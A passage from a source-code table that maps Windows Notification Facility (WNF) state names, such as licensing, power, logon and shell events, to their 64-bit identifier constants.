	{L"WNF_LIC_LOCAL_MIGRATED_LICENSES_FOUND", 0x41850721a3bc4075}, 
	{L"WNF_LIC_MANAGE_DEVICE_REGISTRATION_AND_REACTIVATION", 0x41850721a3bc4875}, 
	{L"WNF_LIC_NO_APPLICABLE_LICENSES_FOUND", 0x41850721a3bc0875}, 
	{L"WNF_LM_APP_LICENSE_EVENT", 0x41c60321a3bc2875}, 
	{L"WNF_LM_CONTENT_LICENSE_CHANGED", 0x41c60321a3bc1075}, 
	{L"WNF_LM_LICENSE_REFRESHED", 0x41c60321a3bc3875}, 
	{L"WNF_LM_OFFLINE_PC_CHANGED", 0x41c60321a3bc3075}, 
	{L"WNF_LM_OPTIONAL_PACKAGE_SUSPEND_REQUIRED", 0x41c60321a3bc2075}, 
	{L"WNF_LM_PACKAGE_SUSPEND_REQUIRED", 0x41c60321a3bc0875}, 
	{L"WNF_LM_ROOT_LICENSE_CHANGED", 0x41c60321a3bc1875}, 
	{L"WNF_LOC_DEVICE_BROKER_ACCESS_CHANGED", 0x41850121a3bc0875}, 
	{L"WNF_LOC_RESERVED_WNF_EVENT", 0x41850121a3bc1075}, 
	{L"WNF_LOC_SHOW_SYSTRAY", 0x41850121a3bc1875}, 
	{L"WNF_LOGN_BIO_ENROLLMENT_APP_INSTANCE_CHANGED", 0xf810121a3bc4075}, 
	{L"WNF_LOGN_CREDENTIAL_TILE_SELECTION_CHANGED", 0xf810121a3bc3075}, 
	{L"WNF_LOGN_EOA_FLYOUT_POSITION", 0xf810121a3bc0835}, 
	{L"WNF_LOGN_LOCAL_SIGNON", 0xf810121a3bc2875}, 
	{L"WNF_LOGN_PINPAD_VISIBLE", 0xf810121a3bc2035}, 
	{L"WNF_LOGN_RETURN_TO_LOCK", 0xf810121a3bc1835}, 
	{L"WNF_LOGN_SLIDE_TO_SHUTDOWN", 0xf810121a3bc1035}, 
	{L"WNF_LOGN_SUPPRESS_FINGERPRINT_WAKE", 0xf810121a3bc3835}, 
	{L"WNF_MAPS_MAPLOADER_PACKAGE_CHANGE", 0x12960f20a3bc2075}, 
	{L"WNF_MAPS_MAPLOADER_PROGRESS", 0x12960f20a3bc1075}, 
	{L"WNF_MAPS_MAPLOADER_STATUS_CHANGE", 0x12960f20a3bc1875}, 
	{L"WNF_MM_BAD_MEMORY_PENDING_REMOVAL", 0x41c60320a3bc0875}, 
	{L"WNF_MM_PHYSICAL_MEMORY_CHANGE", 0x41c60320a3bc1075}, 
	{L"WNF_MON_THERMAL_CAP_CHANGED", 0x41880120a3bc0875}, 
	{L"WNF_MRT_MERGE_SYSTEM_PRI_FILES", 0x41921c20a3bc2075}, 
	{L"WNF_MRT_PERSISTENT_QUALIFIER_CHANGED", 0x41921c20a3bc1c75}, 
	{L"WNF_MRT_QUALIFIER_CONTRAST_CHANGED", 0x41921c20a3bc0875}, 
	{L"WNF_MRT_QUALIFIER_THEME_CHANGED", 0x41921c20a3bc1075}, 
	{L"WNF_MRT_SYSTEM_PRI_MERGE", 0x41921c20a3bc2875}, 
	{L"WNF_MSA_ACCOUNTSTATECHANGE", 0x41871d20a3bc0835}, 
	{L"WNF_MSA_TPM_AVAILABLE", 0x41871d20a3bc1475}, 
	{L"WNF_MSA_TPM_SERVER_CLIENT_KEY_STATE_UPDATED", 0x41871d20a3bc1875}, 
	{L"WNF_MUR_MEDIA_UI_REQUEST_LAN", 0x41941b20a3bc1075}, 
	{L"WNF_MUR_MEDIA_UI_REQUEST_WLAN", 0x41941b20a3bc0875}, 
	{L"WNF_NASV_DYNAMIC_LOCK_BLUETOOTH_STATUS", 0x17950f23a3bc2075}, 
	{L"WNF_NASV_SERVICE_RUNNING", 0x17950f23a3bc1075}, 
	{L"WNF_NASV_USER_AUTHENTICATION", 0x17950f23a3bc1835}, 
	{L"WNF_NASV_USER_PRESENT", 0x17950f23a3bc0835}, 
	{L"WNF_NCB_APP_AVAILABLE", 0x41840d23a3bc0875}, 
	{L"WNF_NDIS_ADAPTER_ARRIVAL", 0x128f0a23a3bc0875}, 
	{L"WNF_NDIS_CORRUPTED_STORE", 0x128f0a23a3bc1075}, 
	{L"WNF_NFC_SE_CARD_EMULATION_STATE_CHANGED", 0x41850823a3bc0875}, 
	{L"WNF_NGC_AIKCERT_TRIGGER", 0x41850923a3bc1075}, 
	{L"WNF_NGC_CREDENTIAL_REFRESH_REQUIRED", 0x41850923a3bc3875}, 
	{L"WNF_NGC_CREDENTIAL_RESET_EXPERIENCE_ACTIVE", 0x41850923a3bc5075}, 
	{L"WNF_NGC_CRYPTO_MDM_POLICY_CHANGED", 0x41850923a3bc3075}, 
	{L"WNF_NGC_GESTURE_AUTHENTICATED", 0x41850923a3bc2875}, 
	{L"WNF_NGC_LAUNCH_NTH_USER_SCENARIO", 0x41850923a3bc6075}, 
	{L"WNF_NGC_LAUNCH_PIN_RESET_SCENARIO", 0x41850923a3bc4875}, 
	{L"WNF_NGC_PIN_RESET_SCENARIO_STATE_CHANGE", 0x41850923a3bc4035}, 
	{L"WNF_NGC_PREGEN_DELAY_TRIGGER", 0x41850923a3bc2075}, 
	{L"WNF_NGC_PREGEN_NGCISOCTNR_TRIGGER", 0x41850923a3bc6875}, 
	{L"WNF_NGC_PREGEN_TRIGGER", 0x41850923a3bc0875}, 
	{L"WNF_NGC_PRO_CSP_POLICY_CHANGED", 0x41850923a3bc1875}, 
	{L"WNF_NLA_CAPABILITY_CHANGE", 0x41870223a3bc0875}, 
	{L"WNF_NLA_TASK_TRIGGER", 0x41870223a3bc1875}, 
	{L"WNF_NLM_HNS_HIDDEN_INTERFACE", 0x418b0223a3bc1875}, 
	{L"WNF_NLM_INTERNET_PRESENT", 0x418b0223a3bc1075}, 
	{L"WNF_NLM_VPN_RECONNECT_CHANGE", 0x418b0223a3bc0875}, 
	{L"WNF_NLS_GEOID_CHANGED", 0x41950223a3bc2035}, 
	{L"WNF_NLS_LOCALE_INFO_CHANGED", 0x41950223a3bc1835}, 
	{L"WNF_NLS_USER_DEFAULT_LOCALE_CHANGED", 0x41950223a3bc0835}, 
	{L"WNF_NLS_USER_UILANG_CHANGED", 0x41950223a3bc1035}, 
	{L"WNF_NPSM_SERVICE_STARTED", 0xc951e23a3bc0875}, 
	{L"WNF_NSI_SERVICE_STATUS", 0x418f1d23a3bc0875}, 
	{L"WNF_OLIC_OS_EDITION_CHANGE", 0x28f0222a3bc5075}, 
	{L"WNF_OLIC_OS_LICENSE_NON_GENUINE", 0x28f0222a3bc6875}, 
	{L"WNF_OLIC_OS_LICENSE_POLICY_CHANGE", 0x28f0222a3bc5875}, 
	{L"WNF_OLIC_OS_LICENSE_TERMS_ACCEPTED", 0x28f0222a3bc6075}, 
	{L"WNF_OOBE_SHL_MAGNIFIER_CONFIRM", 0x4840122a3bc1035}, 
	{L"WNF_OOBE_SHL_MAGNIFIER_QUERY", 0x4840122a3bc0835}, 
	{L"WNF_OOBE_SHL_MONITOR_STATE", 0x4840122a3bc1875}, 
	{L"WNF_OOBE_SHL_SPEECH_CONTROLLER", 0x4840122a3bc2035}, 
	{L"WNF_OSWN_STORAGE_APP_PAIRING_CHANGE", 0xf911d22a3bc8075}, 
	{L"WNF_OSWN_STORAGE_FINISHED_USAGE_CATEGORY_UPDATE", 0xf911d22a3bcb875}, 
	{L"WNF_OSWN_STORAGE_FREE_SPACE_CHANGE", 0xf911d22a3bc7075}, 
	{L"WNF_OSWN_STORAGE_PRESENCE_CHANGE", 0xf911d22a3bc6075}, 
	{L"WNF_OSWN_STORAGE_SHELLHWD_EVENT", 0xf911d22a3bcc075}, 
	{L"WNF_OSWN_STORAGE_TEMP_CLEANUP_CHANGE", 0xf911d22a3bc7875}, 
	{L"WNF_OSWN_STORAGE_VOLUME_STATUS_CHANGE", 0xf911d22a3bc6875}, 
	{L"WNF_OSWN_SYSTEM_CLOCK_CHANGED", 0xf911d22a3bc5875}, 
	{L"WNF_OS_IP_OVER_USB_AVAILABLE", 0x41c61d22a3bc8075}, 
	{L"WNF_OS_IU_PROGRESS_REPORT", 0x41c61d22a3bc8875}, 
	{L"WNF_OVRD_OVERRIDESCALEUPDATED", 0x5941822a3bc0875}, 
	{L"WNF_PAY_CANMAKEPAYMENT_BROKER_READY", 0x419f0f3da3bc0875}, 
	{L"WNF_PFG_PEN_FIRST_DRAG", 0x4181083da3bc1075}, 
	{L"WNF_PFG_PEN_FIRST_TAP", 0x4181083da3bc0875}, 
	{L"WNF_PHNL_LINE1_READY", 0xd88063da3bc4075}, 
	{L"WNF_PHNP_ANNOTATION_ENDPOINT", 0x1188063da3bc4875}, 
	{L"WNF_PHNP_SERVICE_INITIALIZED", 0x1188063da3bc3875}, 
	{L"WNF_PHNP_SIMSEC_READY", 0x1188063da3bc4075}, 
	{L"WNF_PHN_CALLFORWARDING_STATUS_LINE0", 0x4188063da3bc3075}, 
	{L"WNF_PHN_CALL_STATUS", 0x4188063da3bc2875}, 
	{L"WNF_PMEM_MEMORY_ERROR", 0xc83033da3bc0875}, 
	{L"WNF_PNPA_DEVNODES_CHANGED", 0x96003da3bc0875}, 
	{L"WNF_PNPA_DEVNODES_CHANGED_SESSION", 0x96003da3bc1035}, 
	{L"WNF_PNPA_HARDWAREPROFILES_CHANGED", 0x96003da3bc2875}, 
	{L"WNF_PNPA_HARDWAREPROFILES_CHANGED_SESSION", 0x96003da3bc3035}, 
	{L"WNF_PNPA_PORTS_CHANGED", 0x96003da3bc3875}, 
	{L"WNF_PNPA_PORTS_CHANGED_SESSION", 0x96003da3bc4035}, 
	{L"WNF_PNPA_VOLUMES_CHANGED", 0x96003da3bc1875}, 
	{L"WNF_PNPA_VOLUMES_CHANGED_SESSION", 0x96003da3bc2035}, 
	{L"WNF_PNPB_AWAITING_RESPONSE", 0x396003da3bc0875}, 
	{L"WNF_PNPC_CONTAINER_CONFIG_REQUESTED", 0x296003da3bc1875}, 
	{L"WNF_PNPC_DEVICE_INSTALL_REQUESTED", 0x296003da3bc1075}, 
	{L"WNF_PNPC_REBOOT_REQUIRED", 0x296003da3bc0875}, 
	{L"WNF_PO_BACKGROUND_ACTIVITY_POLICY", 0x41c6013da3bc9075}, 
	{L"WNF_PO_BASIC_BRIGHTNESS_ENGINE_DISABLED", 0x41c6013da3bcd075}, 
	{L"WNF_PO_BATTERY_CHARGE_LEVEL", 0x41c6013da3bc8075}, 
	{L"WNF_PO_BATTERY_CHARGE_LIMITING_MODE", 0x41c6013da3bd3875}, 
	{L"WNF_PO_BATTERY_DISCHARGING", 0x41c6013da3bc9875}, 
	{L"WNF_PO_BRIGHTNESS_ALS_OFFSET", 0x41c6013da3bcd875}, 
	{L"WNF_PO_CAD_STICKY_DISABLE_CHARGING", 0x41c6013da3bcf075}, 
	{L"WNF_PO_CHARGE_ESTIMATE", 0x41c6013da3bc6075}, 
	{L"WNF_PO_COMPOSITE_BATTERY", 0x41c6013da3bc1075}, 
	{L"WNF_PO_DISCHARGE_ESTIMATE", 0x41c6013da3bc5075}, 
	{L"WNF_PO_DISCHARGE_START_FILETIME", 0x41c6013da3bc5c75}, 
	{L"WNF_PO_DISPLAY_REQUEST_ACTIVE", 0x41c6013da3bc7835}, 
	{L"WNF_PO_DRIPS_DEVICE_CONSTRAINTS_REGISTERED", 0x41c6013da3bcc875}, 
	{L"WNF_PO_ENERGY_SAVER_OVERRIDE", 0x41c6013da3bc3075}, 
	{L"WNF_PO_ENERGY_SAVER_SETTING", 0x41c6013da3bc2875}, 
	{L"WNF_PO_ENERGY_SAVER_STATE", 0x41c6013da3bc2075}, 
	{L"WNF_PO_INPUT_SUPPRESS_NOTIFICATION", 0x41c6013da3bd1875}, 
	{L"WNF_PO_INPUT_SUPPRESS_NOTIFICATION_EX", 0x41c6013da3bd3075}, 
	{L"WNF_PO_MODERN_STANDBY_EXIT_INITIATED", 0x41c6013da3bcb875}, 
	{L"WNF_PO_OPPORTUNISTIC_CS", 0x41c6013da3bd2875}, 
	{L"WNF_PO_OVERLAY_POWER_SCHEME_UPDATE", 0x41c6013da3bce875}, 
	{L"WNF_PO_POWER_BUTTON_STATE", 0x41c6013da3bcf875}, 
	{L"WNF_PO_POWER_STATE_CHANGE", 0x41c6013da3bc1875}, 
	{L"WNF_PO_PRESLEEP_NOTIFICATION", 0x41c6013da3bd1075}, 
	{L"WNF_PO_PREVIOUS_SHUTDOWN_STATE", 0x41c6013da3bcb075}, 
	{L"WNF_PO_PRIMARY_DISPLAY_LOGICAL_STATE", 0x41c6013da3bca875}, 
	{L"WNF_PO_PRIMARY_DISPLAY_VISIBLE_STATE", 0x41c6013da3bca075}, 
	{L"WNF_PO_SCENARIO_CHANGE", 0x41c6013da3bc0875}, 
	{L"WNF_PO_SLEEP_STUDY_USER_PRESENCE_CHANGED", 0x41c6013da3bc8875}, 
	{L"WNF_PO_SW_HW_DRIPS_DIVERGENCE", 0x41c6013da3bcc075}, 
	{L"WNF_PO_SYSTEM_TIME_CHANGED", 0x41c6013da3bd0075}, 
	{L"WNF_PO_THERMAL_HIBERNATE_OCCURRED", 0x41c6013da3bc4875}, 
	{L"WNF_PO_THERMAL_OVERTHROTTLE", 0x41c6013da3bc6875}, 
	{L"WNF_PO_THERMAL_SHUTDOWN_OCCURRED", 0x41c6013da3bc4075}, 
	{L"WNF_PO_THERMAL_STANDBY", 0x41c6013da3bc3875}, 
	{L"WNF_PO_USER_AWAY_PREDICTION", 0x41c6013da3bc7075}, 
	{L"WNF_PO_VIDEO_INITIALIALIZED", 0x41c6013da3bce075}, 
	{L"WNF_PO_WAKE_ON_VOICE_STATE", 0x41c6013da3bd2075}, 
	{L"WNF_PO_WEAK_CHARGER", 0x41c6013da3bd0875}, 
	{L"WNF_PROV_AUTOPILOT_ASYNC_COMPLETE", 0x17891c3da3bc2075}, 
	{L"WNF_PROV_AUTOPILOT_PROFILE_AVAILABLE", 0x17891c3da3bc1875}, 
	{L"WNF_PROV_AUTOPILOT_TPM_MSA_TRIGGER", 0x17891c3da3bc2875}, 
	{L"WNF_PROV_DEVICE_BOOTSTRAP_COMPLETE", 0x17891c3da3bc3475}, 
	{L"WNF_PROV_TPM_ATTEST_COMPLETE", 0x17891c3da3bc1075}, 
	{L"WNF_PROV_TURN_COMPLETE", 0x17891c3da3bc0875}, 
	{L"WNF_PS_WAKE_CHARGE_RESOURCE_POLICY", 0x41c61d3da3bc0875}, 
	{L"WNF_PTI_WNS_RECEIVED", 0x418f1a3da3bc0875}, 
	{L"WNF_RDR_SMB1_NOT_IN_USE_STATE_CHANGE", 0x41940a3fa3bc0875}, 
	{L"WNF_RM_GAME_MODE_ACTIVE", 0x41c6033fa3bc1075}, 
	{L"WNF_RM_MEMORY_MONITOR_USAGE_METRICS", 0x41c6033fa3bc0875}, 
	{L"WNF_RM_QUIET_MODE", 0x41c6033fa3bc1875}, 
	{L"WNF_RPCF_FWMAN_RUNNING", 0x7851e3fa3bc0875}, 
	{L"WNF_RTDS_NAMED_PIPE_TRIGGER_CHANGED", 0x12821a3fa3bc1875}, 
	{L"WNF_RTDS_RPC_INTERFACE_TRIGGER_CHANGED", 0x12821a3fa3bc0875}, 
	{L"WNF_RTSC_PRIVACY_SETTINGS_CHANGED", 0x2951a3fa3bc0875}, 
	{L"WNF_SBS_UPDATE_AVAILABLE", 0x41950c3ea3bc0875}, 
	{L"WNF_SCM_AUTOSTART_STATE", 0x418b0d3ea3bc0875}, 
	{L"WNF_SDO_ORIENTATION_CHANGE", 0x41890a3ea3bc0875}, 
	{L"WNF_SEB_AIRPLANE_MODE_DISABLED_FOR_EMERGENCY_CALL", 0x41840b3ea3bd7075}, 
	{L"WNF_SEB_APP_LAUNCH_PREFETCH", 0x41840b3ea3bd1075}, 
	{L"WNF_SEB_APP_RESUME", 0x41840b3ea3bd2075}, 
	{L"WNF_SEB_AUDIO_ACTIVITY", 0x41840b3ea3bdb075}, 
	{L"WNF_SEB_BACKGROUND_WORK_COST_CHANGE", 0x41840b3ea3bc8875}, 
	{L"WNF_SEB_BACKGROUND_WORK_COST_HIGH", 0x41840b3ea3bc9075}, 
	{L"WNF_SEB_BATTERY_LEVEL", 0x41840b3ea3bc5075}, 
	{L"WNF_SEB_BOOT", 0x41840b3ea3bc6075}, 
	{L"WNF_SEB_CACHED_FILE_UPDATED", 0x41840b3ea3bcc875}, 
	{L"WNF_SEB_CALL_HISTORY_CHANGED", 0x41840b3ea3bd6075}, 
	{L"WNF_SEB_CALL_STATE_CHANGED", 0x41840b3ea3bd5075}, 
	{L"WNF_SEB_DEFAULT_SIGN_IN_ACCOUNT_CHANGE", 0x41840b3ea3bd9875}, 
	{L"WNF_SEB_DEPRECATED1", 0x41840b3ea3bd1875}, 
	{L"WNF_SEB_DEPRECATED2", 0x41840b3ea3bd2875}, 
	{L"WNF_SEB_DEPRECATED3", 0x41840b3ea3bd3075}, 
	{L"WNF_SEB_DEPRECATED4", 0x41840b3ea3bd3875}, 
	{L"WNF_SEB_DEPRECATED5", 0x41840b3ea3bd4075}, 
	{L"WNF_SEB_DEPRECATED6", 0x41840b3ea3bd4875}, 
	{L"WNF_SEB_DEPRECATED7", 0x41840b3ea3bce075}, 
	{L"WNF_SEB_DEPRECATED8", 0x41840b3ea3bce875}, 
	{L"WNF_SEB_DEV_MNF_CUSTOM_NOTIFICATION_RECEIVED", 0x41840b3ea3bcb875}, 
	{L"WNF_SEB_DOMAIN_JOINED", 0x41840b3ea3bc5875}, 
	{L"WNF_SEB_FREE_NETWORK_PRESENT", 0x41840b3ea3bc1075}, 
	{L"WNF_SEB_FULL_SCREEN_HDR_VIDEO_PLAYBACK", 0x41840b3ea3bdb875}, 
	{L"WNF_SEB_FULL_SCREEN_VIDEO_PLAYBACK", 0x41840b3ea3bd0075}, 
	{L"WNF_SEB_GAME_MODE", 0x41840b3ea3bdd875}, 
	{L"WNF_SEB_GEOLOCATION", 0x41840b3ea3bcb075}, 
	{L"WNF_SEB_INCOMING_CALL_DISMISSED", 0x41840b3ea3bde075}, 
	{L"WNF_SEB_INTERNET_PRESENT", 0x41840b3ea3bc0875}, 
	{L"WNF_SEB_IP_ADDRESS_AVAILABLE", 0x41840b3ea3bc8075}, 
	{L"WNF_SEB_LINE_CHANGED", 0x41840b3ea3bd6875}, 
	{L"WNF_SEB_LOW_LATENCY_POWER_REQUEST", 0x41840b3ea3bcf075}, 
	{L"WNF_SEB_MBAE_NOTIFICATION_RECEIVED", 0x41840b3ea3bc2875}, 
	{L"WNF_SEB_MIXED_REALITY", 0x41840b3ea3bdd075}, 
	{L"WNF_SEB_MOBILE_BROADBAND_DEVICE_SERVICE_NOTIFICATION", 0x41840b3ea3bd9075}, 
	{L"WNF_SEB_MOBILE_BROADBAND_PCO_VALUE_CHANGE", 0x41840b3ea3bdc875}, 
	{L"WNF_SEB_MOBILE_BROADBAND_PIN_LOCK_STATE_CHANGE", 0x41840b3ea3bd8875}, 
	{L"WNF_SEB_MOBILE_BROADBAND_RADIO_STATE_CHANGE", 0x41840b3ea3bd8075}, 
	{L"WNF_SEB_MOBILE_BROADBAND_REGISTRATION_STATE_CHANGE", 0x41840b3ea3bd7875}, 
	{L"WNF_SEB_MOB_OPERATOR_CUSTOM_NOTIFICATION_RECEIVED", 0x41840b3ea3bcc075}, 
	{L"WNF_SEB_MONITOR_ON", 0x41840b3ea3bc7875}, 
	{L"WNF_SEB_NETWORK_CONNECTIVITY_IN_STANDBY", 0x41840b3ea3bda075}, 
	{L"WNF_SEB_NETWORK_CONTROL_CHANNEL_TRIGGER_RESET", 0x41840b3ea3bc3075}, 
	{L"WNF_SEB_NETWORK_STATE_CHANGES", 0x41840b3ea3bc2075}, 
	{L"WNF_SEB_NFC_PERF_BOOST", 0x41840b3ea3bd0875}, 
	{L"WNF_SEB_ONLINE_ID_CONNECTED_STATE_CHANGE", 0x41840b3ea3bc4075}, 
	{L"WNF_SEB_RESILIENCY_NOTIFICATION_PHASE", 0x41840b3ea3bcf875}, 
	{L"WNF_SEB_SMART_CARD_FIELD_INFO_NOTIFICATION", 0x41840b3ea3bcd075}, 
	{L"WNF_SEB_SMART_CARD_HCE_APPLICATION_ACTIVATION_NOTIFICATION", 0x41840b3ea3bcd875}, 
	{L"WNF_SEB_SMART_CARD_TRANSACTION_NOTIFICATION", 0x41840b3ea3bca075}, 
	{L"WNF_SEB_SMS_RECEIVED", 0x41840b3ea3bc1875}, 
	{L"WNF_SEB_SYSTEM_AC", 0x41840b3ea3bc7075}, 
	{L"WNF_SEB_SYSTEM_IDLE", 0x41840b3ea3bc4875}, 
	{L"WNF_SEB_SYSTEM_LPE", 0x41840b3ea3bc9875}, 
	{L"WNF_SEB_SYSTEM_MAINTENANCE", 0x41840b3ea3bca875}, 
	{L"WNF_SEB_TIME_ZONE_CHANGE", 0x41840b3ea3bc3875}, 
	{L"WNF_SEB_USER_PRESENCE_CHANGED", 0x41840b3ea3bda875}, 
	{L"WNF_SEB_USER_PRESENT", 0x41840b3ea3bc6875}, 
	{L"WNF_SEB_UWP_APP_LAUNCH", 0x41840b3ea3bdc075}, 
	{L"WNF_SEB_VOICEMAIL_CHANGED", 0x41840b3ea3bd5875}, 
	{L"WNF_SFA_AUTHENTICATION_STAGE_CHANGED", 0x4187083ea3bc0875}, 
	{L"WNF_SHEL_ABOVE_LOCK_APP_ACTIVE", 0xd83063ea3bd9835}, 
	{L"WNF_SHEL_ABOVE_LOCK_BIO_ACTIVE", 0xd83063ea3bda835}, 
	{L"WNF_SHEL_ACTIONCENTER_READY", 0xd83063ea3bf9835}, 
	{L"WNF_SHEL_ACTIONCENTER_VIEWSTATE_CHANGED", 0xd83063ea3bed035}, 
	{L"WNF_SHEL_APPLICATION_SPATIAL_INFO_UPDATE", 0xd83063ea3bdd875}, 
	{L"WNF_SHEL_APPLICATION_STARTED", 0xd83063ea3be0075}, 
	{L"WNF_SHEL_APPLICATION_STATE_UPDATE", 0xd83063ea3bc7075}, 
	{L"WNF_SHEL_APPLICATION_TERMINATED", 0xd83063ea3be0875}, 
	{L"WNF_SHEL_APPLIFECYCLE_INSTALL_STATE", 0xd83063ea3bee875}, 
	{L"WNF_SHEL_APPRESOLVER_SCAN", 0xd83063ea3bc5075}, 
	{L"WNF_SHEL_ASSISTANT_STATE_CHANGE", 0xd83063ea3bf8875}, 
	{L"WNF_SHEL_CACHED_CLOUD_NETWORK_STATE", 0xd83063ea3bed875}, 
	{L"WNF_SHEL_CALM_DISPLAY_ACTIVE", 0xd83063ea3bdb875}, 
	{L"WNF_SHEL_CDM_FEATURE_CONFIG_FIRST_USAGE", 0xd83063ea3bdf875}, 
	{L"WNF_SHEL_CDM_FEATURE_USAGE", 0xd83063ea3be9075}, 
	{L"WNF_SHEL_CDM_REGISTRATION_COMPLETE", 0xd83063ea3be6835}, 
	{L"WNF_SHEL_CLOUD_FILE_INDEXED_CHANGE", 0xd83063ea3bea875}, 
	{L"WNF_SHEL_CLOUD_FILE_PROGRESS_CHANGE", 0xd83063ea3beb075}, 
	{L"WNF_SHEL_CONTENT_DELIVERY_MANAGER_MONITORING", 0xd83063ea3be70f5}, 
	{L"WNF_SHEL_CONTENT_DELIVERY_MANAGER_NEEDS_REMEDIATION", 0xd83063ea3be4875}, 
	{L"WNF_SHEL_CORTANA_APPINDEX_UPDATED", 0xd83063ea3bc9875}, 
	{L"WNF_SHEL_CORTANA_AUDIO_ACTIVE", 0xd83063ea3bde075}, 
	{L"WNF_SHEL_CORTANA_BEACON_STATE_CHANGED", 0xd83063ea3bf1075}, 
	{L"WNF_SHEL_CORTANA_CAPABILTIES_CHANGED", 0xd83063ea3bf7035}, 
	{L"WNF_SHEL_CORTANA_MIC_TRAINING_COMPLETE", 0xd83063ea3be88f5}, 
	{L"WNF_SHEL_CORTANA_QUIET_MOMENT_AT_HOME", 0xd83063ea3bf0475}, 
	{L"WNF_SHEL_CORTANA_SPEECH_CANCELHANDSFREE_REQUESTED", 0xd83063ea3bdb035}, 
	{L"WNF_SHEL_CREATIVE_EVENT_BATTERY_SAVER_OVERRIDE_TRIGGERED", 0xd83063ea3bf3075}, 
	{L"WNF_SHEL_CREATIVE_EVENT_TRIGGERED", 0xd83063ea3bcd875}, 
	{L"WNF_SHEL_DDC_COMMAND_AVAILABLE", 0xd83063ea3bd2075}, 
	{L"WNF_SHEL_DDC_CONNECTED_ACCOUNTS_CHANGED", 0xd83063ea3bd6075}, 
	{L"WNF_SHEL_DDC_SMS_COMMAND", 0xd83063ea3bd3075}, 
	{L"WNF_SHEL_DDC_WNS_COMMAND", 0xd83063ea3bd2875}, 
	{L"WNF_SHEL_DESKTOP_APPLICATION_STARTED", 0xd83063ea3be5075}, 
	{L"WNF_SHEL_DESKTOP_APPLICATION_TERMINATED", 0xd83063ea3be5875}, 
	{L"WNF_SHEL_DEVICE_LOCKED", 0xd83063ea3bd3875}, 
	{L"WNF_SHEL_DEVICE_OPEN", 0xd83063ea3bf2875}, 
	{L"WNF_SHEL_DEVICE_UNLOCKED", 0xd83063ea3bcc075}, 
	{L"WNF_SHEL_DICTATION_RUNNING", 0xd83063ea3bd1835}, 
	{L"WNF_SHEL_ENTERPRISE_HIDE_PEOPLE_BAR_POLICY_VALUE_CHANGED", 0xd83063ea3be8075}, 
	{L"WNF_SHEL_ENTERPRISE_START_LAYOUT_POLICY_VALUE_CHANGED", 0xd83063ea3bc9475}, 
	{L"WNF_SHEL_ENTERPRISE_START_PLACES_POLICY_VALUE_CHANGED", 0xd83063ea3bec075}, 
	{L"WNF_SHEL_FOCUS_CHANGE", 0xd83063ea3bc7875}, 
	{L"WNF_SHEL_GAMECONTROLLER_FOCUS_INFO", 0xd83063ea3bc8875}, 
	{L"WNF_SHEL_GAMECONTROLLER_LISTENER_INFO", 0xd83063ea3bc8075}, 
	{L"WNF_SHEL_GAMECONTROLLER_NEXUS_INFO", 0xd83063ea3bcf075}, 
	{L"WNF_SHEL_HEALTH_STATE_CHANGED", 0xd83063ea3be4075}, 
	{L"WNF_SHEL_IMMERSIVE_SHELL_RUNNING", 0xd83063ea3bc0875}, 
	{L"WNF_SHEL_INSTALL_PLACEHOLDER_TILES", 0xd83063ea3bdc075}, 
	{L"WNF_SHEL_JUMPLIST_CHANGED", 0xd83063ea3bce075}, 
	{L"WNF_SHEL_LATEST_CONNECTED_AUTOPLAY_DEVICE", 0xd83063ea3bef875}, 
	{L"WNF_SHEL_LOCKAPPHOST_ACTIVE", 0xd83063ea3bf6835}, 
	{L"WNF_SHEL_LOCKSCREEN_ACTIVE", 0xd83063ea3bc5835}, 
	{L"WNF_SHEL_LOCKSCREEN_IMAGE_CHANGED", 0xd83063ea3bd5075}, 
	{L"WNF_SHEL_LOCKSCREEN_INFO_UPDATED", 0xd83063ea3bde835}, 
	{L"WNF_SHEL_LOCKSTATE", 0xd83063ea3bdd075}, 
	{L"WNF_SHEL_LOCK_APP_READY", 0xd83063ea3be3035}, 
	{L"WNF_SHEL_LOCK_APP_RELOCK", 0xd83063ea3be2835}, 
	{L"WNF_SHEL_LOCK_APP_REQUESTING_UNLOCK", 0xd83063ea3bd7835}, 
	{L"WNF_SHEL_LOCK_APP_SHOWN", 0xd83063ea3bd7035}, 
	{L"WNF_SHEL_LOCK_ON_LOGON", 0xd83063ea3bf2035}, 
	{L"WNF_SHEL_LOGON_COMPLETE", 0xd83063ea3bc1875}, 
	{L"WNF_SHEL_NEXT_NOTIFICATION_SINK_SESSION_ID", 0xd83063ea3bf5875}, 
	{L"WNF_SHEL_NOTIFICATIONS", 0xd83063ea3bc1035}, 
	{L"WNF_SHEL_NOTIFICATIONS_CRITICAL", 0xd83063ea3bca835}, 
	{L"WNF_SHEL_NOTIFICATION_SETTINGS_CHANGED", 0xd83063ea3bc3835}, 
	{L"WNF_SHEL_OOBE_ENABLE_PROVISIONING", 0xd83063ea3bd6835}, 
	{L"WNF_SHEL_OOBE_PROVISIONING_COMPLETE", 0xd83063ea3be9c75}, 
	{L"WNF_SHEL_OOBE_USER_LOGON_COMPLETE", 0xd83063ea3bc2475}, 
	{L"WNF_SHEL_PEOPLE_PANE_VIEW_CHANGED", 0xd83063ea3be2035}, 
	{L"WNF_SHEL_PEOPLE_PINNED_LIST_CHANGED", 0xd83063ea3bdc835}, 
	{L"WNF_SHEL_PLACES_CHANGED", 0xd83063ea3bcc875}, 
	{L"WNF_SHEL_QUIETHOURS_ACTIVE_PROFILE_CHANGED", 0xd83063ea3bf1c75}, 
	{L"WNF_SHEL_QUIET_MOMENT_SHELL_MODE_CHANGED", 0xd83063ea3bf5075}, 
	{L"WNF_SHEL_RADIALCONTROLLER_EXPERIENCE_RESTART", 0xd83063ea3bda035}, 
	{L"WNF_SHEL_REQUEST_CORTANA_SETTINGSCONSTRAINTINDEX_BUILD", 0xd83063ea3bd1075}, 
	{L"WNF_SHEL_RESTORE_PAYLOAD_COMPLETE", 0xd83063ea3bef075}, 
	{L"WNF_SHEL_SCREEN_COVERED", 0xd83063ea3bd5875}, 
	{L"WNF_SHEL_SESSION_LOGON_COMPLETE", 0xd83063ea3be3835}, 
	{L"WNF_SHEL_SETTINGS_CHANGED", 0xd83063ea3bcf875}, 
	{L"WNF_SHEL_SETTINGS_ENVIRONMENT_CHANGED", 0xd83063ea3bf4875}, 
	{L"WNF_SHEL_SIGNALMANAGER_NEW_SIGNAL_REGISTERED", 0xd83063ea3bfa035}, 
	{L"WNF_SHEL_SIGNAL_LOGONUI", 0xd83063ea3be7835}, 
	{L"WNF_SHEL_SIGNAL_MANAGER_FEATURE_TRIGGERED", 0xd83063ea3bec875}, 
	{L"WNF_SHEL_SIGNAL_MANAGER_SIGNAL_TRIGGERED", 0xd83063ea3bea075}, 
	{L"WNF_SHEL_SIGNAL_MANAGER_TESTING", 0xd83063ea3bee075}, 
